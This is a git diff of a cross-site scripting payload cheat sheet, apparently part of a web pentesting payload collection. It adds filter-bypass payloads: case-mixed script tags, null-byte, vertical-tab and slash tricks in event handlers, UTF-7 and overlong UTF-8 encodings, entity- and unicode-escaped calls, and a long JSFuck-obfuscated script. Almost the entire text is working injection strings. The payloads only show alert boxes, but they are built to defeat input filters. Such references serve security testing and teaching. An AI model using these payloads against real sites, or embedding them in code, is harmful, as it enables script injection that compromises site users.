@@ -91,7 +91,7 @@ DOM XSS
 #"><img src=/ onerror=alert(2)>
 ```
 
-## XSS in wrappers javascript and data
+## XSS in wrappers javascript and data URI
 XSS with javascript:
 ```
 javascript:prompt(1)
@@ -103,6 +103,7 @@ javascript:prompt(1)
 
 XSS with data:
 ```
+data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 ```
 
@@ -219,31 +220,56 @@ Polyglot XSS - Rsnake
 
 ## Filter Bypass and exotic payloads
 
+Bypass case sensitive
+```
+<sCrIpt>alert(1)</ScRipt>
+```
+
 Bypass quotes for string
 ```
 String.fromCharCode(88,83,83)
 ```
 
-Bypass parenthesis for string
+Bypass dot filter 
+```
+<script>window['alert'](document['domain'])<script>
+```
+
+Bypass parenthesis for string - Firefox
 ```
 alert`1`
 ```
 
-Exotic payloads
+Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
 ```
-<script>$=1,alert($)</script>
-<script ~~~>confirm(1)</script ~~~> 
-<script>$=1,\u0061lert($)</script>
-<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
-<</script/script><script ~~~>\u0061lert(1)</script ~~~>
-</style></scRipt><scRipt>alert(1)</scRipt>
-<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
-<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
-<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
-<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<img src='1' onerror\x00=alert(0) />
+<img src='1' onerror\x0b=alert(0) />
 ```
 
-Using Unicode
+Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
+```
+<img src='1' onerror/=alert(0) />
+```
+
+Bypass space filter with "/" - IE/Firefox/Chrome/Safari
+```
+<img/src='1'/onerror=alert(0)>
+```
+
+Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+```
+<img src='1' onerror='alert(0)' <
+```
+
+Bypass using an alternate way to execute js
+```
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+```
+
+Bypass using Unicode
 ```
 Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
 transformed into U+003C LESS­THAN SIGN (<)
@@ -266,33 +292,48 @@ transformed into U+0027 APOSTROPHE (')
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
 %EF%BC%9E becomes >
 %EF%BC%9C becomes <
+```
 
-Overlong UTF-8
+Bypass using overlong UTF-8
+```
 < = %C0%BC = %E0%80%BC = %F0%80%80%BC
 > = %C0%BE = %E0%80%BE = %F0%80%80%BE
 ' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
 " = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
 " = %CA%BA
 ' = %CA%B9
-
 ```
 
-
-HTTP Parameter Pollution
+Bypass using UTF-7
 ```
-http://target.com/something.xxx?a=val1&a=val2
-ASP.NET 	a = val1,val2
-ASP 		a = val1,val2
-JSP 		a = val1
-PHP 		a = val2
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
 ```
 
-
-
-Use JSFuck to encode the payload (alert())
+Bypass using weird encoding or native interpretation to hide the payload (alert())
 ```javascript
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
 <script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
 <script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+```
+
+
+
+
+Exotic payloads
+```
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~> 
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
 ```
 
 
@@ -303,3 +344,4 @@ Use JSFuck to encode the payload (alert())
 * http://www.thespanner.co.uk/2014/03/21/rpo/
 * http://blog.innerht.ml/rpo-gadgets/
 * http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite
+* http://d3adend.org/xss/ghettoBypass
